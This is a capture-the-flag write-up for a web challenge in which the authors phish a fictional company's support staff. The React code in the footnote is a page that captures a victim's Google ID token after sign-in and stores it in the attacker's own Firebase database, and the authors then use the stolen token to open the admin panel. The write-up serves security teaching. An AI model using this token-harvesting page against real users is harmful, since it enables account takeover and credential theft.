# TaiYang IT Solution Part 2: Electric Boogaloo

**Category**: Web

895 points | 4 solves

----

## Challenge Description

After the initial vulnerability disclosure, TaiYang IT Solution employed a new cybersecurity specialist to secure their systems which used Google Sign-In.

They were complaining about how their support staff would just login with the company Google Account to any website they received in their Inbox! How terrible!

Challenge is here (part 2!): [link] (see Admin Panel Modern)

This challenge may require you to setup a Google Firebase Project.

This challenge may require you to send emails (you could use Gmail, or Outlook, anything really).

^ source is slightly modified from original


## Attached files
* link to webpage
* 7z file containing source code of page

----

## Solution

Part 2 of this challenge requires us to gain access to v2 of the portal.

[screenshot]

This time, they actually verify that the token is legitimate, and denies access if it is not:

[screenshot]

This means that, unlike in [Part 1](../TaiYang%20IT%20Solution%20Part%201), we cannot simply use a doctored token, but instead have to somehow obtain the legitimate token from TaiYang IT Solution.

Luckily for us, we've heard that their support staff logs in with their company Google Account to any website they receive in their inbox. Combine this information with the other hints in the challenge description, and we now know that:

1. We have to email TaiYang IT Solution with a website containing a Google sign-in that will somehow allow us to get their token.
2. This can be achieved by creating a Firebase project of our own.

With that, we can create a project in Firebase and enable Google authentication:

[screenshot]

Additionally, we can use the Firestore Database to store any data, such as the token.

Now, we can set up the web page to send to TaiYang. I opted for a simple React app, but I'd guess that it could work with simple HTML/CSS/JS as well.

After looking through the Firebase documentation, I put together a patchwork of code snippets (see [footnote](#footnote)) that lets the user sign in, and then stores the JWT token in the database.

Then, we hosted the webpage online (Firebase has hosting, but we were strapped for time so my teammate helped host it on his server) and emailed the link to TaiYang IT Solution's email address.

[screenshot]

After receiving confirmation that they had, in fact, clicked on our very nice and incredibly benign link, we can now use the token we stored, and access the flag.

[screenshots]

### Flag:
```
IRS{a77rac71ng_y0uR_aUD13nc3}
```

[< Part 1](../TaiYang%20IT%20Solution%20Part%201)

----

### Footnote
Here are the relevant documentation pages containing the snippets we used:
* [Google sign-in](https://firebase.google.com/docs/auth/web/google-signin#handle_the_sign-in_flow_with_the_firebase_sdk)
* [Retrieving ID token after sign in](https://firebase.google.com/docs/auth/admin/verify-id-tokens#retrieve_id_tokens_on_clients)
* [Adding data to Firestore](https://firebase.google.com/docs/firestore/quickstart#add_data)

Here's the code we used for our page (cleaned up because the original was a mess):

**App.js:**
```jsx
import './App.css';
import React from 'react';

import { getAuth, signInWithPopup, GoogleAuthProvider } from "firebase/auth";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore"; 

const firebaseConfig = {
  // {firebase config stuff such as the API key}
};

const app = initializeApp(firebaseConfig);
const db = getFirestore();
const provider = new GoogleAuthProvider();

function signIn() {
  const auth = getAuth();
  signInWithPopup(auth, provider)
    .then((result) => {
      auth.currentUser.getIdToken(/* forceRefresh */ true).then(async function(idToken) {
        // uploads jwt to firestore db
        try {
          const docRef = await addDoc(collection(db, "users"), {
            name: user.displayName,
            token: idToken
          });
          console.log("Document written with ID: ", docRef.id);
        } catch (e) {
          console.error("Error adding document: ", e);
        }
        }).catch(function(error) {
          // {this was very rushed we didn't have time to handle errors}
        });

    }).catch((error) => {
      const errorMessage = error.message;
      console.log(errorMessage);
    });
}

export class App extends React.Component {
  render() {
    return (
      <a onClick={ () => signIn() }>
          click me pls!
      </a>
    );
  }
}

export default App;
```
